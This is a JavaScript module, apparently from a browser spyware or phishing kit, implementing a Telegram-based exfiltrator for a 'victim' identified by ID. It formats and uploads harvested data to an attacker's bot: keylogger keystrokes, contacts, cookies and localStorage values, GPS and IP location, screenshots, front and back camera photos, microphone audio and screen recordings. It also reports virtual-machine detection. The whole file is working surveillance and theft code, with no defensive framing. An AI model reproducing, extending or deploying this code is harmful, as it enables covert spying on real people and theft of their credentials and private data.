// language: JavaScript, file: exfiltrators/telegram.js
// *rich per-collector formatting ported from monolithic build; parse_mode fallback retained*

export class Exfiltrator {
    constructor(config) {
        this.config = config;
        this.botToken = config.botToken;
        this.chatId = config.chatId;
        this.apiUrl = `https://api.telegram.org/bot${this.botToken}`;
        this.name = 'Telegram';
        this.victimId = config.victimId || 'Unknown';
    }

    async sendData(collectorName, data) {
        if (collectorName === 'screenRecorder' && data.type === 'file' && data.blob) {
            return this.sendFile(data.blob, {
                duration: data.duration, size: data.size, format: data.format,
                victimId: this.victimId, timestamp: data.timestamp,
            });
        }
        if (collectorName === 'screenRecorder' && data.chunks && data.totalChunks > 1) {
            return this.sendChunkedVideo(data);
        }
        if (collectorName === 'media') {
            const m = this.formatDataMessage('media', data);
            await this.sendMessage(m);
            if (data.screenshot?.data) await this.sendPhoto(data.screenshot.data, `🖥️ Screenshot — ${this.victimId}`);
            if (data.camera?.data) await this.sendPhoto(data.camera.data, `📷 Front cam — ${this.victimId}`);
            if (data.backCamera?.data) await this.sendPhoto(data.backCamera.data, `📷 Back cam — ${this.victimId}`);
            if (data.microphone?.data) await this.sendAudio(data.microphone.data, `🎤 5s audio — ${this.victimId}`);
            return true;
        }
        // location is handled by core.handleEnhancedLocation, but keep fallback
        if (collectorName === 'location') {
            return this.sendMessage(this.formatLocationMessage(data));
        }
        return this.sendMessage(this.formatDataMessage(collectorName, data));
    }

    // ------------------------------------------------------------
    // RICH FORMATTERS — ported from monolithic build
    // ------------------------------------------------------------

    formatDataMessage(collectorName, data) {
        let m = `📊 *${collectorName.toUpperCase()}*\n\n🆔 \`${this.victimId}\`\n⏰ ${new Date(data.timestamp || Date.now()).toLocaleString()}\n`;
        switch (collectorName) {
            case 'device':
                m += `📟 Device: ${data.deviceType || '?'}\n`;
                m += `🖥️ OS: ${data.os || '?'}\n`;
                m += `🌐 Browser: ${data.browser || '?'}\n`;
                m += `🗣️ Language: ${data.language || '?'}\n`;
                m += `🖥️ Screen: ${data.screen?.width}x${data.screen?.height} (${data.screen?.colorDepth} bit)\n`;
                m += `💾 Memory: ${data.deviceMemory || 'Unknown'} GB\n`;
                m += `⚡ Cores: ${data.hardwareConcurrency || 'Unknown'}\n`;
                m += `🕐 TZ: ${data.timezone || '?'}\n`;
                m += `📱 Touch: ${data.maxTouchPoints || 0} points\n`;
                break;
            case 'network': {
                const loc = [data.city, data.region, data.country].filter(Boolean).join(', ') || '?';
                m += `📡 IPv4: \`${data.ipv4 || '?'}\`\n`;
                if (data.ipv6) m += `📡 IPv6: \`${data.ipv6}\`\n`;
                m += `📍 ${loc}\n`;
                m += `🏢 ISP: ${data.isp || data.organization || data.asn || '?'}\n`;
                if (data.timezone) m += `🕐 TZ: ${data.timezone}\n`;
                if (data.connection) {
                    m += `📶 ${data.connection.effectiveType || '?'} | ⬇️ ${data.connection.downlink || '?'}Mbps | ⏱️ ${data.connection.rtt || '?'}ms\n`;
                    if (data.connection.saveData !== undefined) m += `💾 SaveData: ${data.connection.saveData}\n`;
                }
                break;
            }
            case 'media': {
                const s = [];
                if (data.screenshot?.resolution) s.push(`🖥️ ${data.screenshot.resolution}`);
                if (data.camera?.resolution) s.push(`📷 front ${data.camera.resolution}`);
                else if (data.camera?.status === 'denied') s.push(`📷 front denied`);
                if (data.backCamera?.resolution) s.push(`📷 back ${data.backCamera.resolution}`);
                else if (data.backCamera?.status === 'denied') s.push(`📷 back denied`);
                if (data.microphone?.duration) s.push(`🎤 ${data.microphone.duration}s`);
                else if (data.microphone?.status === 'denied') s.push(`🎤 denied`);
                m += s.join(' | ') || 'no media captured';
                break;
            }
            case 'sensors':
                if (data.battery) {
                    m += `🔋 Battery: ${data.battery.level}% ${data.battery.charging ? '⚡ (charging)' : '🔌'}\n`;
                    if (data.battery.chargingTime && data.battery.chargingTime !== Infinity && data.battery.chargingTime >= 0) {
                        m += `⏳ Charge time: ${data.battery.chargingTime}s\n`;
                    }
                    if (data.battery.dischargingTime && data.battery.dischargingTime !== Infinity && data.battery.dischargingTime >= 0) {
                        m += `⏳ Discharge time: ${data.battery.dischargingTime}s\n`;
                    }
                }
                if (data.orientation && data.orientation.alpha !== undefined) {
                    m += `🧭 Orientation:\n`;
                    m += `   α ${data.orientation.alpha?.toFixed(2)}°\n`;
                    m += `   β ${data.orientation.beta?.toFixed(2)}°\n`;
                    m += `   γ ${data.orientation.gamma?.toFixed(2)}°\n`;
                    if (data.orientation.absolute !== undefined) m += `   absolute: ${data.orientation.absolute}\n`;
                }
                if (data.motion?.acceleration?.x !== undefined) {
                    m += `⚡ Acceleration:\n`;
                    m += `   X ${data.motion.acceleration.x?.toFixed(2)} m/s²\n`;
                    m += `   Y ${data.motion.acceleration.y?.toFixed(2)} m/s²\n`;
                    m += `   Z ${data.motion.acceleration.z?.toFixed(2)} m/s²\n`;
                }
                if (data.motion?.accelerationIncludingGravity?.x !== undefined) {
                    m += `🌍 Accel w/ gravity:\n`;
                    m += `   X ${data.motion.accelerationIncludingGravity.x?.toFixed(2)}\n`;
                    m += `   Y ${data.motion.accelerationIncludingGravity.y?.toFixed(2)}\n`;
                    m += `   Z ${data.motion.accelerationIncludingGravity.z?.toFixed(2)}\n`;
                }
                if (data.motion?.rotationRate?.alpha !== undefined) {
                    m += `🔄 Rotation: α${data.motion.rotationRate.alpha?.toFixed(1)} β${data.motion.rotationRate.beta?.toFixed(1)} γ${data.motion.rotationRate.gamma?.toFixed(1)}\n`;
                }
                if (data.vibration) m += `📳 Vibration: ${data.vibration.supported ? 'supported' : 'no'}\n`;
                break;
            case 'browser':
                m += `📖 Title: ${data.title || '?'}\n`;
                m += `🔗 URL: ${data.url || '?'}\n`;
                m += `↩️ Referrer: ${data.referrer || 'None'}\n`;
                m += `📚 History: ${data.historyLength} entries\n`;
                m += `🍪 Cookies: ${data.cookies ? data.cookies.length + ' chars' : 'none'}\n`;
                m += `💾 LocalStorage: ${Object.keys(data.localStorage || {}).length} items\n`;
                m += `💾 SessionStorage: ${Object.keys(data.sessionStorage || {}).length} items\n`;
                m += `🔌 Plugins: ${(data.plugins || []).length} | MIME: ${(data.mimeTypes || []).length}\n`;
                if (data.permissions) {
                    const granted = Object.entries(data.permissions).filter(([_, v]) => v === 'granted').map(([k]) => k);
                    const denied = Object.entries(data.permissions).filter(([_, v]) => v === 'denied').map(([k]) => k);
                    if (granted.length) m += `🔐 Granted: ${granted.join(', ')}\n`;
                    if (denied.length) m += `🚫 Denied: ${denied.join(', ')}\n`;
                }
                if (data.storageEstimate) {
                    const s = data.storageEstimate;
                    m += `💽 Storage: ${(s.usage/1024/1024).toFixed(2)}MB / ${(s.quota/1024/1024).toFixed(0)}MB (${s.usagePercent}%)\n`;
                }
                // dump localStorage keys/values if small
                const lsKeys = Object.keys(data.localStorage || {});
                if (lsKeys.length > 0 && lsKeys.length <= 5) {
                    m += `\n📦 *localStorage:*\n`;
                    for (const k of lsKeys.slice(0, 5)) {
                        const v = String(data.localStorage[k]).substring(0, 80);
                        m += `\`${k}\` = \`${v}\`\n`;
                    }
                }
                break;
            case 'contacts':
                if (data.status === 'granted') {
                    m += `👥 ${data.count} contacts\n`;
                    (data.data || []).slice(0, 5).forEach((c, i) => {
                        m += `\n*Contact ${i+1}:* ${c.name || 'Unknown'}\n`;
                        if (c.phones?.length) m += `  📱 ${c.phones.join(', ')}\n`;
                        if (c.emails?.length) m += `  📧 ${c.emails.join(', ')}\n`;
                    });
                    if (data.count > 5) m += `\n... +${data.count - 5} more\n`;
                } else {
                    m += `📞 Status: ${data.status}\n`;
                    if (data.error) m += `💥 ${data.error}\n`;
                }
                break;
            case 'fingerprint':
                if (data.webgl) {
                    m += `🎮 Renderer: ${data.webgl.renderer || '?'}\n`;
                    m += `🏢 Vendor: ${data.webgl.vendor || '?'}\n`;
                    if (data.webgl.version) m += `📦 Version: ${data.webgl.version}\n`;
                    if (data.webgl.shadingLanguageVersion) m += `📦 Shading: ${data.webgl.shadingLanguageVersion}\n`;
                    if (data.webgl.maxTextureSize) m += `🧵 Max texture: ${data.webgl.maxTextureSize}\n`;
                    if (data.webgl.maxVertexAttribs) m += `🔢 Max attribs: ${data.webgl.maxVertexAttribs}\n`;
                }
                if (data.audio) {
                    m += `🎵 Audio: ${data.audio.sampleRate}Hz | ${data.audio.channelCount}ch | ${data.audio.state}\n`;
                }
                m += `🔌 Plugins: ${data.plugins || 0} | MIME: ${data.mimeTypes || 0}\n`;
                if (data.fonts?.length) {
                    m += `🔤 Fonts (${data.fonts.length}): ${data.fonts.slice(0, 8).join(', ')}`;
                    if (data.fonts.length > 8) m += `... +${data.fonts.length - 8}`;
                    m += `\n`;
                }
                if (data.canvas) {
                    m += `🎨 Canvas hash: \`${String(data.canvas).substring(0, 40)}...\`\n`;
                }
                break;
            case 'keylogger':
                m += `⌨️ ${data.count} keystrokes\n`;
                (data.keys || []).slice(0, 10).forEach(k => {
                    const tgt = k.target?.name || k.target?.id || k.target?.tag || '?';
                    m += `  \`${k.key}\` → ${tgt}\n`;
                });
                if ((data.count || 0) > 10) m += `  ... +${data.count - 10} more\n`;
                break;
            default:
                m += `\`\`\`\n${JSON.stringify(data, null, 2).substring(0, 800)}\n\`\`\``;
        }
        return m + `\n\n🔗 ${location.href}`;
    }

    formatLocationMessage(data) {
        // Fallback if core.handleEnhancedLocation didn't run
        let m = `📍 *LOCATION*\n\n🆔 \`${this.victimId}\`\n`;
        if (data.source === 'gps' && typeof data.latitude === 'number') {
            m += `🎯 GPS: ${data.latitude.toFixed(6)}, ${data.longitude.toFixed(6)}\n`;
            if (data.accuracy) m += `📏 Accuracy: ±${data.accuracy.toFixed(0)}m\n`;
            if (data.altitude != null) m += `⛰️ Altitude: ${data.altitude}m\n`;
            m += `\n🗺️ [Google](https://www.google.com/maps?q=${data.latitude},${data.longitude})`;
        } else if (data.data) {
            m += `📍 IP-loc: ${data.data.city || '?'}, ${data.data.region || '?'}, ${data.data.country || '?'}\n`;
            if (data.data.latitude) m += `🎯 ~${data.data.latitude.toFixed(4)}, ${data.data.longitude.toFixed(4)} (±50km)\n`;
        } else {
            m += `📍 unavailable`;
        }
        return m + `\n\n🔗 ${location.href}`;
    }

    // ------------------------------------------------------------
    // EXISTING SEND METHODS (unchanged, kept complete)
    // ------------------------------------------------------------

    async sendFile(blob, metadata = {}) {
        try {
            const fd = new FormData();
            fd.append('chat_id', this.chatId);
            fd.append('document', blob, `recording-${Date.now()}.webm`);
            fd.append('parse_mode', 'Markdown');
            let cap = `🎬 *Screen Recording*\n`;
            cap += `⏱️ ${metadata.duration || '?'}s | 📊 ${(blob.size/1024/1024).toFixed(2)} MB\n`;
            cap += `🆔 ${metadata.victimId || this.victimId}\n`;
            cap += `⏰ ${new Date(metadata.timestamp || Date.now()).toLocaleString()}`;
            fd.append('caption', cap.substring(0, 1024));
            const r = await fetch(`${this.apiUrl}/sendDocument`, { method: 'POST', body: fd, cache: 'no-store' });
            return (await r.json()).ok === true;
        } catch (e) { return false; }
    }

    async sendChunkedVideo(v) {
        await this.sendMessage(
            `🎬 *SCREEN RECORDING (CHUNKED)*\n` +
            `📦 ${v.totalChunks} chunks | ⏱️ ${v.duration}s | 📊 ${(v.size/1024/1024).toFixed(2)} MB\n` +
            `🆔 ${this.victimId}`
        );
        let ok = 0;
        for (let i = 0; i < v.chunks.length; i++) {
            const sent = await this.sendMessage(`📹 *CHUNK ${i+1}/${v.totalChunks}*\n\n${v.chunks[i]}`);
            if (sent) ok++;
            if (i < v.chunks.length - 1) await this.delay(500);
        }
        await this.sendMessage(`✅ Sent ${ok}/${v.totalChunks} chunks — reassemble in order`);
        return ok === v.totalChunks;
    }

    async sendSummary(d) {
        let m = `🎯 *FULL DATA SUMMARY*\n\n🆔 \`${d.id}\`\n⏰ ${new Date(d.timestamp).toLocaleString()}\n🔗 ${d.campaign?.url || '?'}\n\n`;
        if (d.device) {
            m += `📱 ${d.device.deviceType} | ${d.device.browser} | ${d.device.os}\n`;
            m += `🖥️ ${d.device.screen?.width}x${d.device.screen?.height} | ⚡ ${d.device.hardwareConcurrency} cores\n`;
        }
        if (d.network) {
            const n = d.network;
            const loc = [n.city, n.country].filter(Boolean).join(', ') || '?';
            m += `🌐 \`${n.ipv4}\` — ${loc}\n`;
            if (n.isp) m += `🏢 ${n.isp}\n`;
        }
        if (d.location) {
            if (d.location.coordinates) {
                m += `🎯 ${d.location.coordinates.lat.toFixed(6)}, ${d.location.coordinates.lon.toFixed(6)} (${d.location.coordinates.source})\n`;
            }
            if (d.location.address) m += `🏠 ${d.location.address}\n`;
            if (d.location.formats?.w3w) m += `🔤 w3w: ${d.location.formats.w3w}\n`;
        }
        if (d.media) {
            if (d.media.screenshot?.resolution) m += `🖥️ Shot: ${d.media.screenshot.resolution}\n`;
            if (d.media.camera?.resolution) m += `📷 Cam: ${d.media.camera.resolution}\n`;
            if (d.media.backCamera?.resolution) m += `📷 BackCam: ${d.media.backCamera.resolution}\n`;
            if (d.media.microphone?.duration) m += `🎤 Audio: ${d.media.microphone.duration}s\n`;
        }
        if (d.screenRecorder && !d.screenRecorder.error) {
            m += `🎬 Rec: ${(d.screenRecorder.size/1024/1024).toFixed(2)} MB\n`;
        }
        if (d.sensors?.battery?.level !== undefined) {
            m += `🔋 ${d.sensors.battery.level}% ${d.sensors.battery.charging ? '⚡' : '🔌'}\n`;
        }
        if (d.contacts?.count > 0) m += `📞 Contacts: ${d.contacts.count}\n`;
        if (d.fingerprint?.webgl) m += `🎮 ${d.fingerprint.webgl.renderer || '?'}\n`;
        if (d.fingerprint?.fonts?.length) m += `🔤 ${d.fingerprint.fonts.length} fonts\n`;
        if (d.keylogger?.count > 0) m += `⌨️ ${d.keylogger.count} keystrokes\n`;
        if (d.vmDetected?.isVM) m += `⚠️ VM: ${d.vmDetected.flags.join(', ')}\n`;
        m += `\n📊 Data types sent: ${Object.keys(d).filter(k => !['id','timestamp','campaign','vmDetected','_errors'].includes(k) && !k.endsWith('_error')).length}`;
        return this.sendMessage(m);
    }

    async sendError(err) {
        let m = `❌ *ERROR*\n\n🆔 ${err.id || this.victimId}\n💥 ${err.message || 'unknown'}\n`;
        if (err.stack) m += `\`\`\`\n${err.stack.substring(0, 200)}\n\`\`\``;
        return this.sendMessage(m);
    }

    async notify(event, data) {
        let m = `🚨 *${event}*\n\n🆔 ${data.id || this.victimId}\n⏰ ${new Date().toLocaleString()}\n🔗 ${data.url || location.href}`;
        return this.sendMessage(m);
    }

    async sendMessage(message) {
        try {
            if (message.length > 4096) message = message.substring(0, 4090) + '\n..._(truncated)_';
            const r = await fetch(`${this.apiUrl}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: this.chatId, text: message, parse_mode: 'Markdown',
                    disable_web_page_preview: true, disable_notification: true,
                }),
                cache: 'no-store',
            });
            const j = await r.json();
            if (!j.ok && /parse entities|can't parse/i.test(j.description || '')) {
                const plain = message.replace(/[*_`\[\]]/g, '');
                const r2 = await fetch(`${this.apiUrl}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: this.chatId, text: plain, disable_web_page_preview: true, disable_notification: true }),
                    cache: 'no-store',
                });
                return (await r2.json()).ok === true;
            }
            return j.ok === true;
        } catch (e) { return false; }
    }

    async sendPhoto(photoData, caption = '') {
        try {
            const blob = await fetch(photoData).then(r => r.blob());
            const fd = new FormData();
            fd.append('chat_id', this.chatId);
            fd.append('photo', blob, 'photo.jpg');
            fd.append('parse_mode', 'Markdown');
            if (caption) fd.append('caption', caption.substring(0, 1024));
            const r = await fetch(`${this.apiUrl}/sendPhoto`, { method: 'POST', body: fd, cache: 'no-store' });
            return (await r.json()).ok === true;
        } catch (e) { return false; }
    }

    async sendAudio(audioData, caption = '') {
        try {
            const blob = await fetch(audioData).then(r => r.blob());
            const fd = new FormData();
            fd.append('chat_id', this.chatId);
            fd.append('audio', blob, 'audio.webm');
            fd.append('parse_mode', 'Markdown');
            if (caption) fd.append('caption', caption.substring(0, 1024));
            const r = await fetch(`${this.apiUrl}/sendAudio`, { method: 'POST', body: fd, cache: 'no-store' });
            return (await r.json()).ok === true;
        } catch (e) { return false; }
    }

    chunkBase64(s, n) {
        const out = [];
        for (let i = 0; i < s.length; i += n) out.push(s.slice(i, i + n));
        return out;
    }
    delay(ms) { return new Promise(r => setTimeout(r, ms)); }
}